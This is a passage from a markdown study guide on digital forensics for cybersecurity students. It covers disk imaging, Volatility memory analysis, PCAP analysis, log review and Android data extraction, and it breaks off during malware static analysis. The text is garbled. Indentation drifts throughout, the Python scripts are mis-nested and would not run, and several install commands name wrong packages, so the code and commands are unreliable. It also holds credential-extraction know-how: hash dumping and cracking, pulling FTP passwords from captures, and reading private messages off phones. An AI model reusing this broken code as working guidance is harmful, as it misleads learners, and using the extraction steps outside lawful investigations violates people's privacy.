# 🔍 Digital Forensics & Pro Hacker — Complete Mastery Guide
### From Cyber Security Student to Professional Security Expert

> **Who is this for?** You are a cyber security department student who knows:
> MERN development, basic hacking, WiFi attacks, web vulnerabilities, reverse engineering.
> This guide takes you from student → professional security expert.

---

## 📚 Table of Contents

### PART A — DIGITAL FORENSICS
1. [What is Digital Forensics?](#1-what-is-digital-forensics)
2. [Forensics Lab Setup](#2-forensics-lab-setup)
3. [Disk Forensics](#3-disk-forensics)
4. [Memory Forensics](#4-memory-forensics)
5. [Network Forensics](#5-network-forensics)
6. [File System Forensics](#6-file-system-forensics)
7. [Log Analysis](#7-log-analysis)
8. [Mobile Forensics](#8-mobile-forensics)
9. [Malware Forensics](#9-malware-forensics)
10. [Email Forensics](#10-email-forensics)

### PART B — PRO HACKER SKILLS
11. [The Professional Hacker Mindset](#11-pro-hacker-mindset)
12. [Complete Penetration Testing Methodology](#12-pentest-methodology)
13. [Advanced Reconnaissance](#13-advanced-recon)
14. [Exploitation Mastery](#14-exploitation-mastery)
15. [Post-Exploitation](#15-post-exploitation)
16. [Pivoting and Lateral Movement](#16-pivoting)
17. [Covering Tracks](#17-covering-tracks)
18. [Report Writing](#18-report-writing)
19. [CTF Strategy](#19-ctf-strategy)
20. [Career Roadmap](#20-career-roadmap)

---

# PART A — DIGITAL FORENSICS

## 1. What is Digital Forensics?

### Definition

Digital Forensics is the science of collecting, preserving, analyzing, and presenting
digital evidence in a way that is legally admissible in court.

```
Think of it like:
Physical crime scene → investigators collect fingerprints, DNA, weapons
Digital crime scene  → forensics experts collect files, logs, memory dumps, packets

The SAME principles apply:
Don't contaminate evidence
Document everything
Maintain chain of custody
Be able to reproduce your findings
```

### The 5 Phases of Digital Forensics

```
Phase 1: IDENTIFICATION
What devices/systems are involved?
What type of evidence might exist?
What are the boundaries of the investigation?

Examples:
- Identify all computers, phones, USB drives
- Identify relevant cloud accounts
- Identify network devices and logs

Phase 2: PRESERVATION
Protect evidence from modification!
Create forensic copies (images) of everything
Document state of evidence before touching
Write-blockers prevent accidental writes to drives

Golden Rule: NEVER work on original evidence directly
Always work on forensic copies (images)

Phase 3: COLLECTION
Acquire data in a forensically sound manner
Use verified tools
Calculate and verify hash values (MD5/SHA256)
Hash before = hash after → evidence not modified

Phase 4: ANALYSIS
Examine the collected evidence
Look for:
- Deleted files
- Hidden data
- Timeline of events
- User activity
- Malware
- Communication records

Phase 5: REPORTING
Document all findings
Explain in non-technical language (for court/management)
Include: methodology, tools used, findings, timeline
Must be reproducible by another forensic examiner
```

### Chain of Custody

```
Chain of Custody = documented record of who handled evidence, when, and how

WHY IT MATTERS:
Evidence without proper custody → thrown out of court
Defense attorney: "How do we know this wasn't modified after collection?"
Without custody record → cannot prove integrity

WHAT IT INCLUDES:
When evidence was collected
Who collected it
How it was stored
Who accessed it and when
How it was transported
Hash values at each stage

EXAMPLE CUSTODY RECORD:
Item: Hard Drive, Serial: WD-1234567890
┌─────────────────────────────────────────────────────────┐
│ Date/Time          │ Person        │ Action              │
│─────────────────────────────────────────────────────────│
│ 2024-01-15 09:00   │ Det. Ahmed    │ Seized from scene   │
│ 2024-01-15 10:30   │ Det. Ahmed    │ Transferred to lab  │
│ 2024-01-15 11:00   │ Analyst Reza  │ Received at lab     │
│ 2024-01-15 11:15   │ Analyst Reza  │ Hash computed: abc  │
│ 2024-01-15 11:30   │ Analyst Reza  │ Image created       │
└─────────────────────────────────────────────────────────┘
```

---

## 2. Forensics Lab Setup

### Install Essential Tools on Parrot OS

```bash
# Parrot OS already has many forensics tools
# Update first:
sudo apt update && sudo apt upgrade -y

# ── DISK FORENSICS ──────────────────────────────────────────────
sudo apt install -y \
autopsy \          # GUI forensics platform (like a full investigation suite)
sleuthkit \        # Command-line forensics (fls, icat, fsstat, etc.)
dc3dd \            # Forensic disk copy with hashing
dcfldd \           # Enhanced dd with hashing
foremost \         # File carving (recover deleted files)
	scalpel \          # Advanced file carving
	bulk-extractor \   # Extract emails, URLs, credit cards from disk images
	testdisk \         # Recover lost partitions and files
	photorec           # Recover deleted photos and files
	
	# ── MEMORY FORENSICS ────────────────────────────────────────────
	sudo apt install -y \
	volatility3 \      # Memory analysis framework
	lime-forensics     # Load LiME module to capture RAM
	
	pip3 install volatility3
	
	# ── NETWORK FORENSICS ───────────────────────────────────────────
	sudo apt install -y \
	wireshark \        # Packet analysis
	tshark \           # CLI version of Wireshark
	tcpdump \          # CLI packet capture
	networkMiner \     # Network forensics tool
	zeek               # Network analysis framework (formerly Bro)
	
	# ── FILE ANALYSIS ───────────────────────────────────────────────
	sudo apt install -y \
	binwalk \          # Firmware/binary analysis
	exiftool \         # Metadata extraction
	strings \          # Extract strings from binaries
	hexedit \          # Hex editor
	xxd \              # Hex dump utility
	file \             # Identify file types
	steghide \         # Steganography detection/extraction
	stegsolve          # Steganography analysis
	
	# ── HASH TOOLS ──────────────────────────────────────────────────
	sudo apt install -y \
	hashdeep \         # Hash multiple files, compare sets
	md5sum \           # MD5 hashing
	sha256sum          # SHA256 hashing
	
	# ── LOG ANALYSIS ────────────────────────────────────────────────
	sudo apt install -y \
	logwatch \         # Log summarizer
	grepcidr           # IP address filtering in logs
	
	pip3 install pandas matplotlib jupyter
	
	echo "Forensics tools installed!"
	```
	
	### Create Forensics Workspace
	
	```bash
	# Create organized workspace
	mkdir -p ~/forensics_lab/{cases,tools,evidence,reports,scripts}
	mkdir -p ~/forensics_lab/cases/{case001}/{evidence,images,analysis,reports}
	
	# Case directory structure:
	# forensics_lab/
	# └── cases/
	#     └── case001/
	#         ├── evidence/     ← Original evidence (READ ONLY after acquisition)
	#         ├── images/       ← Forensic copies of drives/memory
	#         ├── analysis/     ← Your working directory
	#         └── reports/      ← Final reports
	
	echo "Workspace created at ~/forensics_lab/"
	```
	
	---
	
	## 3. Disk Forensics
	
	### Creating a Forensic Image
	
	The FIRST thing you do: create an exact copy. Never work on originals!
	
	```bash
	# ── METHOD 1: dd (basic, built into Linux) ──────────────────────
	
	# Check what drives are connected:
	lsblk
	# or:
	sudo fdisk -l
	
	# Create forensic image:
	# if = input file (the drive to image)
	# of = output file (where to save the image)
	# bs = block size (512 bytes = standard sector size)
	# conv=noerror = continue even if read errors
	# status=progress = show progress
	
	sudo dd if=/dev/sdb \
	of=~/forensics_lab/cases/case001/images/disk.img \
	bs=512 \
	conv=noerror,sync \
	status=progress
	
	# Verify with hash:
	md5sum ~/forensics_lab/cases/case001/images/disk.img
	sha256sum ~/forensics_lab/cases/case001/images/disk.img
	# SAVE THESE HASHES → proves image wasn't modified later
	
	# ── METHOD 2: dc3dd (forensics-grade, better than dd) ──────────
	
	sudo dc3dd if=/dev/sdb \
	of=~/forensics_lab/cases/case001/images/disk.img \
	hash=sha256 \
	log=~/forensics_lab/cases/case001/images/acquisition.log
	# Automatically calculates hash during acquisition!
	# Log file contains all details
	
	# ── METHOD 3: dcfldd (similar to dc3dd) ────────────────────────
	
	sudo dcfldd if=/dev/sdb \
	of=~/forensics_lab/cases/case001/images/disk.img \
	hash=md5,sha256 \
	hashlog=~/forensics_lab/cases/case001/images/hash.log \
	bs=512
	
	# Verify the image integrity:
	md5sum -c hash.log
	```
	
	### Mounting and Examining Images
	
	```bash
	# Mount the image (READ-ONLY) for examination:
	sudo mkdir /mnt/evidence
	sudo mount -o ro,loop \
	~/forensics_lab/cases/case001/images/disk.img \
	/mnt/evidence
	
	# Now browse it safely:
	ls /mnt/evidence
	ls /mnt/evidence/Users/         # Windows: user folders
	ls /mnt/evidence/home/          # Linux: user home dirs
	
	# Find recently modified files:
	find /mnt/evidence -newer /mnt/evidence/reference -type f 2>/dev/null
	
	# Find hidden files:
	find /mnt/evidence -name ".*" 2>/dev/null
	
	# Unmount when done:
	sudo umount /mnt/evidence
	```
	
	### The Sleuth Kit — Forensic Analysis
	
	```bash
	# ── fsstat: File System Information ─────────────────────────────
	fsstat disk.img
	# Shows: file system type, size, dates, sector layout
	
	# ── fls: List Files (including DELETED) ─────────────────────────
	fls disk.img
	# Shows ALL files including deleted ones!
	# Output: r/r = regular file, d/d = directory, * = deleted
	
	# List specific directory:
	fls disk.img 5    # 5 = inode number of directory
	
	# Recursive listing:
	fls -r disk.img
	
	# Show deleted files only:
	fls -d disk.img
	
	# ── istat: File/Inode Details ────────────────────────────────────
	istat disk.img 100    # Details about inode 100
	# Shows: file name, size, timestamps (MAC times), blocks used
	
	# ── icat: Extract File Content ───────────────────────────────────
	# Extract file by inode number (even if deleted!):
	icat disk.img 100 > recovered_file.txt
	
	# Extract the MFT (Master File Table on NTFS):
	icat disk.img 0 > mft.raw
	
	# ── MAC Times: Modified, Accessed, Created ───────────────────────
	# Every file has 3 timestamps:
	# M = Modified  (content was changed)
	# A = Accessed  (file was read)
	# C = Changed   (metadata changed — like permissions)
	# (Windows also has: B = Born = creation time)
	#
	# These times tell you WHAT HAPPENED and WHEN
	# Attackers often try to change/wipe these (anti-forensics)
	```
	
	### Recovering Deleted Files
	
	```bash
	# ── METHOD 1: foremost (file carving) ───────────────────────────
	# Carving = find files by their "magic bytes" (file signatures)
	# Works even when file system is damaged/deleted!
	
	foremost -i disk.img -o ~/forensics_lab/cases/case001/analysis/carved/
		# Creates folders: jpg/, pdf/, doc/, zip/, etc.
		# Each folder has recovered files of that type
		
		# ── METHOD 2: scalpel (better carving) ──────────────────────────
		scalpel disk.img -o ~/forensics_lab/cases/case001/analysis/scalpel/
		
		# ── METHOD 3: photorec (recover photos + 400 file types) ────────
		photorec disk.img
		# Interactive menu, very user friendly
		# Recovers: photos, videos, documents, databases, etc.
		
		# ── METHOD 4: testdisk (recover partitions) ─────────────────────
		testdisk disk.img
		# Interactive menu
		# Can recover: deleted partitions, corrupted partition tables
		# Also has file recovery mode
		```
		
		### File Signature Analysis
		
		```bash
		# Every file type has "magic bytes" at the start:
		# These tell you what a file REALLY is (even if renamed!)
		
		# Common magic bytes:
		# JPEG: FF D8 FF E0
		# PNG:  89 50 4E 47 0D 0A 1A 0A
		# PDF:  25 50 44 46 (%PDF)
		# ZIP:  50 4B 03 04
		# EXE:  4D 5A (MZ)
		# RAR:  52 61 72 21 (Rar!)
		
		# Check file signature:
		file suspicious.bin
		# Output: "suspicious.bin: JPEG image data"
		# Even if it's renamed to .txt!
		
		xxd suspicious.bin | head -3
		# First 16 bytes in hex
		
		# More detailed:
		hexdump -C suspicious.bin | head -5
		```
		
		---
		
		## 4. Memory Forensics
		
		### Why Memory Forensics?
		
		```
		Things that ONLY exist in RAM (not on disk):
		Running processes
		Network connections
		Encryption keys (BitLocker, TrueCrypt keys!)
		Passwords typed but not saved
		Malware that runs only in memory (fileless malware)
		Browser history (current session)
		Clipboard contents
		Logged-in user credentials
		
		Memory is VOLATILE — lost when computer is turned off!
		Must capture BEFORE powering down the device.
		```
		
		### Capturing Memory
		
		```bash
		# ── LINUX: Use LiME (Linux Memory Extractor) ────────────────────
		
		# Install LiME:
		sudo apt install linux-headers-$(uname -r)
		git clone https://github.com/504ensicsLabs/LiME
		cd LiME/src
		make
		
		# Load module to dump RAM:
		sudo insmod lime-$(uname -r).ko \
		"path=/tmp/memory.lime format=lime"
		
		# Memory is now at /tmp/memory.lime
		# Copy it off the system for analysis
		
		# ── WINDOWS: WinPmem ────────────────────────────────────────────
		# Run on Windows machine:
		# winpmem_mini_x64_rc2.exe memory.raw
		
		# ── VIRTUAL MACHINE: Just suspend! ──────────────────────────────
		# VMware: Suspend VM → .vmem file = memory dump
		# VirtualBox: Machine → Save State → .sav file = memory
		```
		
		### Volatility 3 — Memory Analysis
		
		```bash
		# ── SETUP ────────────────────────────────────────────────────────
		pip3 install volatility3
		
		# Basic usage:
		vol -f memory.lime [plugin]
		
		# Identify the OS profile:
		vol -f memory.lime windows.info.Info
		vol -f memory.lime linux.info.Info
		
		# ── PROCESS ANALYSIS ─────────────────────────────────────────────
		
		# List all running processes:
		vol -f memory.lime windows.pslist.PsList
		# Shows: PID, PPID (parent), Name, Start time
		
		# Process tree (parent-child relationships):
		vol -f memory.lime windows.pstree.PsTree
		# Malware often spawns child processes — look for unusual parents!
		
		# Find hidden processes (rootkit detection):
		vol -f memory.lime windows.psscan.PsScan
		# Different algorithm than pslist — finds hidden/unlinked processes!
		# If process in psscan but NOT in pslist → HIDDEN PROCESS → malware!
		
		# ── NETWORK CONNECTIONS ───────────────────────────────────────────
		
		# Active network connections:
		vol -f memory.lime windows.netstat.NetStat
		# Shows: PID, Protocol, Local address:port, Remote address:port, State
		
		# Historical connections (even closed ones):
		vol -f memory.lime windows.netscan.NetScan
		
		# What to look for:
		# - Connections to unusual IPs
		# - Processes that shouldn't have network access (notepad.exe connecting!)
		# - Connections on unusual ports (4444 = Metasploit!)
		
		# ── MEMORY DUMPS OF SPECIFIC PROCESSES ───────────────────────────
		
		# Dump a specific process memory:
		vol -f memory.lime windows.memmap.Memmap --pid 1234 --dump
		# Creates file: pid.1234.dmp
		
		# Dump ALL processes:
		vol -f memory.lime windows.dumpfiles.DumpFiles
		
		# ── FIND MALWARE ─────────────────────────────────────────────────
		
		# Find injected code (code that doesn't belong in a process):
		vol -f memory.lime windows.malfind.Malfind
		# Looks for:
		# - Executable memory regions that aren't mapped to files
		# - Memory with unusual permissions (read+write+execute)
		# High confidence malware indicator!
		
		# Check DLL loading:
		vol -f memory.lime windows.dlllist.DllList --pid 1234
		# Unusual DLLs = possible DLL injection
		
		# ── CREDENTIALS ───────────────────────────────────────────────────
		
		# Dump password hashes (Windows):
		vol -f memory.lime windows.hashdump.Hashdump
		# Output: username:LM_hash:NTLM_hash
		# Crack with: hashcat -m 1000 hashes.txt wordlist.txt
		
		# Find LSA secrets:
		vol -f memory.lime windows.lsadump.Lsadump
		
		# ── REGISTRY ──────────────────────────────────────────────────────
		
		# Print a specific registry key:
		vol -f memory.lime windows.registry.printkey.PrintKey \
		--key "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
		# Shows programs set to auto-run (persistence!)
		
		# ── TIMELINE ─────────────────────────────────────────────────────
		
		# Create timeline of all activity:
		vol -f memory.lime timeliner.Timeliner
		# Creates massive timeline of: processes, files, registry changes
		```
		
		### Memory Forensics Cheatsheet
		
		```bash
		# Quick investigation workflow:
		
		echo "=== MEMORY FORENSICS QUICK WORKFLOW ==="
		
		# 1. What OS?
		vol -f memory.lime windows.info.Info
		
		# 2. What processes were running?
		vol -f memory.lime windows.pslist.PsList > processes.txt
		cat processes.txt
		
		# 3. Any hidden processes? (rootkits)
		vol -f memory.lime windows.psscan.PsScan > psscan.txt
		# Compare with pslist — differences = hidden processes
		
		# 4. Network connections?
		vol -f memory.lime windows.netscan.NetScan > network.txt
		cat network.txt
		
		# 5. Any malware indicators?
		vol -f memory.lime windows.malfind.Malfind > malfind.txt
		
		# 6. Password hashes?
		vol -f memory.lime windows.hashdump.Hashdump
		
		# 7. What ran automatically? (persistence)
		vol -f memory.lime windows.registry.printkey.PrintKey \
		--key "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
		```
		
		---
		
		## 5. Network Forensics
		
		### Analyzing PCAP Files
		
		```bash
		# ── WIRESHARK ─────────────────────────────────────────────────────
		wireshark capture.pcap
		
		# Key Wireshark filters for forensics:
		# http                               → All HTTP traffic
		# http.request.method == "POST"      → Data being submitted
		# dns                                → DNS queries (what sites visited)
		# ssl.handshake.type == 1            → TLS ClientHello (shows domains!)
		# tcp.flags.syn == 1 && tcp.flags.ack == 0  → Connection attempts
		# icmp                               → Ping traffic
		# smtp || pop3 || imap               → Email traffic
		# ftp                                → FTP (cleartext credentials!)
		
		# ── TSHARK (Command Line) ─────────────────────────────────────────
		
		# Extract all HTTP requests:
		tshark -r capture.pcap -Y "http.request" \
		-T fields -e ip.src -e http.host -e http.request.uri
		
		# Extract all DNS queries (see what sites were visited):
		tshark -r capture.pcap -Y "dns.flags.response == 0" \
		-T fields -e ip.src -e dns.qry.name
		
		# Extract credentials from FTP/HTTP:
		tshark -r capture.pcap -Y "ftp.request.command == USER || ftp.request.command == PASS" \
		-T fields -e ip.src -e ftp.request.arg
		
		# Extract files transferred over HTTP:
		tshark -r capture.pcap --export-objects http,./extracted_files/
		
		# ── NETWORK TIMELINE ──────────────────────────────────────────────
		
		# Create connection timeline:
		tshark -r capture.pcap \
		-T fields \
		-e frame.time \
		-e ip.src \
		-e ip.dst \
		-e tcp.dstport \
		| head -50
		
		# ── STATISTICS ────────────────────────────────────────────────────
		
		# Top talkers (most traffic):
		tshark -r capture.pcap -q -z conv,ip
		
		# Protocol distribution:
		tshark -r capture.pcap -q -z io,phs
		```
		
		### Network Forensics Script
		
		```python
		# network_forensics.py
		# Analyze PCAP file and extract key information
		
		from scapy.all import rdpcap, DNS, DNSQR, IP, TCP, Raw, HTTP
		from collections import defaultdict, Counter
		import json
		
		def analyze_pcap(pcap_file):
		print(f"\n{'='*60}")
		print(f"NETWORK FORENSICS ANALYSIS: {pcap_file}")
		print(f"{'='*60}\n")
		
		packets = rdpcap(pcap_file)
		print(f"[*] Total packets: {len(packets)}")
		
		# Initialize collectors
		dns_queries = []
		http_requests = []
		connections = defaultdict(set)
		protocols = Counter()
		
		for pkt in packets:
			# Track protocols
			if pkt.haslayer('IP'):
				src = pkt['IP'].src
				dst = pkt['IP'].dst
				
				if pkt.haslayer('TCP'):
					protocols['TCP'] += 1
					dport = pkt['TCP'].dport
					connections[src].add(f"{dst}:{dport}")
					
					if pkt.haslayer('UDP'):
						protocols['UDP'] += 1
						
						# DNS queries (shows what domains were looked up)
						if pkt.haslayer(DNS) and pkt.haslayer(DNSQR):
							if pkt[DNS].qr == 0:  # Query (not response)
								domain = pkt[DNSQR].qname.decode().rstrip('.')
								src_ip = pkt[IP].src if pkt.haslayer(IP) else 'Unknown'
								dns_queries.append({
									'from': src_ip,
									'domain': domain
								})
								
								# HTTP requests
								if pkt.haslayer(Raw) and pkt.haslayer(TCP):
									payload = pkt[Raw].load.decode('utf-8', errors='ignore')
									if payload.startswith(('GET', 'POST', 'PUT', 'DELETE')):
										lines = payload.split('\r\n')
										method_path = lines[0] if lines else ''
										host = next((l.replace('Host: ', '')
										for l in lines if l.startswith('Host:')), 'Unknown')
										http_requests.append({
											'from': pkt[IP].src if pkt.haslayer(IP) else 'Unknown',
															 'host': host,
															 'request': method_path
										})
										
										# ── PRINT FINDINGS ───────────────────────────────────────────
										
										print(f"\n[+] PROTOCOL DISTRIBUTION:")
										for proto, count in protocols.most_common():
											print(f"    {proto}: {count} packets")
											
											print(f"\n[+] DNS QUERIES ({len(dns_queries)} total):")
											unique_domains = set(q['domain'] for q in dns_queries)
											for domain in sorted(unique_domains):
												print(f"    {domain}")
												
												print(f"\n[+] HTTP REQUESTS ({len(http_requests)} total):")
												for req in http_requests[:20]:
													print(f"    {req['from']} → {req['host']} {req['request'][:60]}")
													
													print(f"\n[+] TOP CONNECTIONS:")
													for src, dsts in list(connections.items())[:10]:
														print(f"    {src} connected to {len(dsts)} destinations")
														for dst in list(dsts)[:3]:
															print(f"      → {dst}")
															
															# ── SUSPICIOUS INDICATORS ─────────────────────────────────────
															print(f"\n[!] SUSPICIOUS INDICATORS:")
															
															# Common malware ports
															suspicious_ports = {4444, 1337, 6666, 31337, 5555, 9090}
															for src, dsts in connections.items():
																for dst_port in dsts:
																	port = int(dst_port.split(':')[-1])
																	if port in suspicious_ports:
																		print(f"    ⚠ Connection to suspicious port: {src} → {dst_port}")
																		
																		# DGA-like domains (random looking)
																		import math
																		from collections import Counter as Cnt
																		def entropy(s):
																		c = Cnt(s)
																		return -sum((v/len(s))*math.log2(v/len(s)) for v in c.values())
																		
																		for domain in unique_domains:
																			base = domain.split('.')[0]
																			if len(base) > 12 and entropy(base) > 3.5:
																				print(f"    ⚠ Possible DGA domain: {domain}")
																				
																				return {
																					'total_packets': len(packets),
																					'dns_queries': dns_queries,
																					'http_requests': http_requests,
																					'unique_domains': list(unique_domains)
																				}
																				
																				# Usage:
																				# results = analyze_pcap('capture.pcap')
																				# print(json.dumps(results, indent=2))
																				```
																				
																				---
																				
																				## 6. File System Forensics
																				
																				### NTFS Artifacts (Windows)
																				
																				```bash
																				# ── $MFT (Master File Table) ─────────────────────────────────────
																				# Contains metadata for EVERY file ever created!
																				# Even deleted files leave traces in the MFT
																				
																				# Extract MFT from image:
																				icat disk.img 0 > mft.raw
																				
																				# Parse MFT:
																				python3 -m pip install MFTECmd
																				# Or use Autopsy/FTK which parses automatically
																				
																				# ── $LogFile ──────────────────────────────────────────────────────
																				# NTFS transaction log — records file system changes
																				# Can recover recently deleted files using log
																				
																				# ── $UsnJrnl (USN Change Journal) ────────────────────────────────
																				# Records every file change (create, modify, delete, rename)
																				# Like a detailed diary of file system activity
																				
																				# Extract with:
																				icat disk.img 500 > usnjrnl.raw  # Inode varies
																				
																				# ── Windows Registry Forensics ────────────────────────────────────
																				
																				# Mount the registry hive:
																				sudo apt install reglookup
																				reglookup SOFTWARE > software_registry.txt
																				
																				# Key registry artifacts:
																				# HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run  → Autostart programs
																				# HKLM\SYSTEM\CurrentControlSet\Services              → Services (malware persistence)
																				# HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs → Recent files
																				# HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths → Typed URLs
																				# NTUSER.DAT → User-specific activities
																				
																				# ── Prefetch Files ────────────────────────────────────────────────
																				# Windows records what programs were run in Prefetch files!
																				# Location: C:\Windows\Prefetch\*.pf
																				# Shows: program name, run count, last run time, files accessed
																				
																				ls /mnt/evidence/Windows/Prefetch/
																				# Example: NOTEPAD.EXE-B2B17906.pf → Notepad was run!
																				# MALWARE.EXE-XXXXXXXX.pf → Malware was executed!
																				
																				# Parse prefetch with:
																				sudo apt install winprefetchview  # Or use Autopsy
																				```
																				
																				### Linux Artifacts
																				
																				```bash
																				# ── Command History ──────────────────────────────────────────────
																				cat ~/.bash_history
																				cat ~/.zsh_history
																				# Shows every command the user typed!
																				
																				# ── Log Files ────────────────────────────────────────────────────
																				# Authentication logs:
																				cat /var/log/auth.log      # SSH logins, sudo usage
																				cat /var/log/secure        # Red Hat/CentOS equivalent
																				
																				# System logs:
																				cat /var/log/syslog
																				cat /var/log/messages
																				
																				# Web server logs:
																				cat /var/log/apache2/access.log
																				cat /var/log/nginx/access.log
																				
																				# ── Cron Jobs (Persistence) ──────────────────────────────────────
																				cat /etc/crontab
																				ls /etc/cron.*
																				crontab -l
																				# Attackers add cron jobs for persistence
																				
																				# ── Recently Accessed Files ───────────────────────────────────────
																				# .recently-used.xbel in home directory
																				cat ~/.local/share/recently-used.xbel
																				
																				# ── Sudo Usage ────────────────────────────────────────────────────
																				grep sudo /var/log/auth.log | tail -20
																				# Shows who used sudo, when, and what command
																				```
																				
																				---
																				
																				## 7. Log Analysis
																				
																				### Windows Event Logs
																				
																				```bash
																				# Key Windows Event IDs to know:
																				# 4624 → Successful login
																				# 4625 → Failed login attempt
																				# 4634 → User logged off
																				# 4648 → Login with explicit credentials (runas)
																				# 4720 → New user account created
																				# 4722 → User account enabled
																				# 4724 → Password reset
																				# 4728 → User added to security group
																				# 4732 → User added to local admin group (!)
																				# 4768 → Kerberos ticket requested
																				# 4769 → Kerberos service ticket requested
																				# 4771 → Kerberos pre-auth failed
																				# 4776 → NTLM authentication
																				# 7045 → New service installed (malware!)
																				# 1102 → Audit log cleared (attacker covering tracks!)
																				
																				# Parse Windows Event Logs:
																				sudo apt install libevtx-utils
																				evtxexport Security.evtx | grep "Event ID: 4625" | head -20
																				# Shows all failed logins
																				
																				# Python parsing:
																				pip3 install python-evtx
																				```
																				
																				```python
																				# log_analyzer.py
																				# Analyze Windows Event Logs and Linux auth logs
																				
																				import re
																				from datetime import datetime
																				from collections import Counter, defaultdict
																				
																				def analyze_auth_log(log_file):
																				"""Analyze Linux auth.log for suspicious activity"""
																				
																				print(f"\n{'='*60}")
																				print(f"AUTH LOG ANALYSIS: {log_file}")
																				print(f"{'='*60}\n")
																				
																				failed_logins = []
																				successful_logins = []
																				sudo_usage = []
																				new_users = []
																				
																				patterns = {
																					'failed': r'(\w+\s+\d+\s+[\d:]+).*Failed password for (.+?) from ([\d.]+)',
																					'success': r'(\w+\s+\d+\s+[\d:]+).*Accepted password for (.+?) from ([\d.]+)',
																					'sudo': r'(\w+\s+\d+\s+[\d:]+).*sudo.*COMMAND=(.*)',
																					'new_user': r'(\w+\s+\d+\s+[\d:]+).*new user.*name=(\w+)',
																				}
																				
																				try:
																				with open(log_file, 'r', errors='ignore') as f:
																				for line in f:
																					# Failed logins
																					match = re.search(patterns['failed'], line)
																					if match:
																						failed_logins.append({
																							'time': match.group(1),
																											 'user': match.group(2),
																											 'ip': match.group(3)
																						})
																						
																						# Successful logins
																						match = re.search(patterns['success'], line)
																						if match:
																							successful_logins.append({
																								'time': match.group(1),
																													 'user': match.group(2),
																													 'ip': match.group(3)
																							})
																							
																							# Sudo usage
																							match = re.search(patterns['sudo'], line)
																							if match:
																								sudo_usage.append({
																									'time': match.group(1),
																												  'command': match.group(2)
																								})
																								
																								# New users created
																								match = re.search(patterns['new_user'], line)
																								if match:
																									new_users.append({
																										'time': match.group(1),
																													 'user': match.group(2)
																									})
																									
																									except FileNotFoundError:
																									print(f"[-] File not found: {log_file}")
																									return
																									
																									# ── PRINT ANALYSIS ────────────────────────────────────────────
																									
																									print(f"[+] Total failed logins: {len(failed_logins)}")
																									print(f"[+] Total successful logins: {len(successful_logins)}")
																									print(f"[+] Sudo commands used: {len(sudo_usage)}")
																									print(f"[+] New users created: {len(new_users)}")
																									
																									# Top attacking IPs:
																									if failed_logins:
																										attacking_ips = Counter(f['ip'] for f in failed_logins)
																										print(f"\n[!] TOP ATTACKING IPs (brute force):")
																										for ip, count in attacking_ips.most_common(10):
																											print(f"    {ip}: {count} failed attempts")
																											if count > 10:
																												print(f"      ⚠ BRUTE FORCE DETECTED!")
																												
																												# Users being attacked:
																												if failed_logins:
																													targeted_users = Counter(f['user'] for f in failed_logins)
																													print(f"\n[!] TARGETED USERS:")
																													for user, count in targeted_users.most_common(5):
																														print(f"    {user}: {count} failed attempts")
																														
																														# Successful logins:
																														if successful_logins:
																															print(f"\n[+] SUCCESSFUL LOGINS:")
																															for login in successful_logins[-10:]:
																																print(f"    {login['time']}: {login['user']} from {login['ip']}")
																																
																																# New users (suspicious if unexpected):
																																if new_users:
																																	print(f"\n[!] NEW USERS CREATED:")
																																	for user in new_users:
																																		print(f"    {user['time']}: {user['user']} ← INVESTIGATE!")
																																		
																																		# Sudo usage:
																																		if sudo_usage:
																																			print(f"\n[+] SUDO COMMANDS (last 10):")
																																			for cmd in sudo_usage[-10:]:
																																				print(f"    {cmd['time']}: {cmd['command'][:80]}")
																																				
																																				# Usage:
																																				analyze_auth_log('/var/log/auth.log')
																																				analyze_auth_log('/var/log/secure')
																																				```
																																				
																																				---
																																				
																																				## 8. Mobile Forensics
																																				
																																				### Android Forensics
																																				
																																				```bash
																																				# ── ADB ACQUISITION ───────────────────────────────────────────────
																																				adb devices                   # List connected devices
																																				
																																				# Logical acquisition (user data):
																																				adb backup -all -f backup.ab  # Full backup
																																				
																																				# Pull app data:
																																				adb pull /data/data/ ./app_data/         # All app data (needs root)
																																				adb pull /sdcard/ ./sdcard_data/         # External storage
																																				
																																				# ── KEY ANDROID LOCATIONS ─────────────────────────────────────────
																																				# /data/data/[package]/databases/*.db  → App databases (WhatsApp, etc.)
																																				# /data/data/[package]/shared_prefs/   → App preferences
																																				# /sdcard/DCIM/                        → Photos
																																				# /sdcard/WhatsApp/                    → WhatsApp media
																																				# /data/misc/wifi/WifiConfigStore.xml  → Saved WiFi passwords!
																																				
																																				# ── SQLITE DATABASE ANALYSIS ──────────────────────────────────────
																																				# Most apps store data in SQLite databases
																																				
																																				# Extract WhatsApp messages:
																																				adb pull /data/data/com.whatsapp/databases/msgstore.db ./
																																				
																																				sqlite3 msgstore.db
																																				.tables                    # List all tables
																																				SELECT * FROM messages LIMIT 10;  # Read messages
																																				SELECT body, timestamp FROM messages ORDER BY timestamp;
																																				
																																				# Browser history:
																																				adb pull /data/data/com.android.browser/databases/browser.db ./
																																				sqlite3 browser.db "SELECT url, title, date FROM history ORDER BY date"
																																				
																																				# Call logs:
																																				adb pull /data/data/com.android.providers.contacts/databases/contacts2.db ./
																																				sqlite3 contacts2.db "SELECT number, date, duration, type FROM calls ORDER BY date"
																																				
																																				# SMS messages:
																																				adb pull /data/data/com.android.providers.telephony/databases/mmssms.db ./
																																				sqlite3 mmssms.db "SELECT address, body, date FROM sms ORDER BY date"
																																				```
																																				
																																				### Mobile Forensics Tools
																																				
																																				```bash
																																				# Autopsy (has mobile support)
																																				# ALEAPP — Android Logs Events And Protobuf Parser
																																				pip3 install ALEAPP
																																				
																																				# MVT (Mobile Verification Toolkit) — detect spyware (Pegasus!)
																																				pip3 install mvt
																																				mvt-android check-backup backup.ab --output ./results/
																																				```
																																				
																																				---
																																				
																																				## 9. Malware Forensics
																																				
																																				### Static Analysis
																																				
																																				```bash
																																				# ── BASIC FILE ANALYSIS ───────────────────────────────────────────
																																				
																																				# File type:
																																				file malware.exe
																																				# "malware.exe: PE32+ executable (GUI) x86-64"
																																				
																																				# Hashes (check against VirusTotal):
																																				md5sum malware.exe
																																				sha256sum malware.exe
																																				# Upload hash to virustotal.com
																																				
																																				# Strings (what text is embedded):
																																				strings malware.exe | grep -E "(http|ftp|cmd|powershell|registry)"
																																				strings -e l malware.exe  # Unicode strings
																																				
																																				# Imports (what Windows functions it uses):
																																				objdump -p malware.exe | grep -A 5 "Import"
																																				# Dangerous imports: CreateRemoteThread, VirtualAllocEx, WriteProcessMemory
